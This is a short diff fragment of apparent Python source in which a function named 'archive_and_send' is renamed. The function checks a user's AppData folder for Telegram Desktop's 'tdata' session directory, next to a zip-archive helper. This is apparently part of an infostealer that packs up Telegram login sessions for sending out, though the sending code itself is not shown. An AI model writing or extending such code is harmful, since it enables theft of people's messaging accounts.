@@ -341,7 +341,7 @@ def create_zip_archive(source_dir, output_zip):
         print(f"Error creating zip archive: {str(e)}")
         return None
 
-def archive_and_send():
+def archive_and_send2():
     user = os.path.expanduser("~")
     if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
         try:
